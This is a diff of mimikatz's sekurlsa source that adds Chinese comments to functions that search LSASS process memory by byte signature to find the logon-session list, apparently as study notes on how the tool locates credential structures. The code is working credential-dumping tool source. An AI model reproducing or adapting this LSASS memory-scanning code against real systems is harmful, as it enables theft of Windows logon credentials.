@@ -51,38 +51,38 @@ KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 #endif
 
 PLIST_ENTRY LogonSessionList = NULL;
-PULONG LogonSessionListCount = NULL;
+PULONG LogonSessionListCount = NULL;  //执行成果后这里会被贴上地址LogonSessionListCount地址
 
-BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
+BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)  //在 LSASS 进程内存中搜索关键数据结构
 {
-	PVOID *pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &LogonSessionListCount);
+	PVOID *pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &LogonSessionListCount);  //启用全局变量，用来存储登录会话链表
 	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL, NULL);
 }
 
 BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PVOID * genericPtr2, PLONG genericOffset1)
 {
 	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
-	KULL_M_MEMORY_SEARCH sMemory = {{{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL};
+	KULL_M_MEMORY_SEARCH sMemory = {{{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL};  //设置一个搜索范围：模块基址 + 模块大小
 	PKULL_M_PATCH_GENERIC currentReference;
 	#if defined(_M_X64)
 		LONG offset;
 	#endif
 
-	if(currentReference = kull_m_patch_getGenericFromBuild(generics, cbGenerics, cLsass->osContext.BuildNumber))
+	if(currentReference = kull_m_patch_getGenericFromBuild(generics, cbGenerics, cLsass->osContext.BuildNumber))  //根据系统版本选择正确的特征码
 	{
 		aLocalMemory.address = currentReference->Search.Pattern;
-		if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
+		if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))  //通过特征搜索
 		{
-			aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0; // optimize one day
+			aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0; // optimize one day  目标进程（LSASS）内存里，指令的 disp32 偏移字段所在的位置
 			if(genericOffset1)
-				*genericOffset1 = currentReference->Offsets.off1;
+				*genericOffset1 = currentReference->Offsets.off1;  //第二个偏移量
 		#if defined(_M_ARM64)
 			*genericPtr = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff0); // TODO:ARM64
 			pLib->isInit = (*genericPtr) ? TRUE : FALSE;
 		#elif defined(_M_X64)
 			aLocalMemory.address = &offset;
 			if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
-				*genericPtr = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
+				*genericPtr = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);  //LSASS 内存中目标全局变量（例如 LogonSessionList）的实际地址
 		#elif defined(_M_IX86)
 			aLocalMemory.address = genericPtr;
 			pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
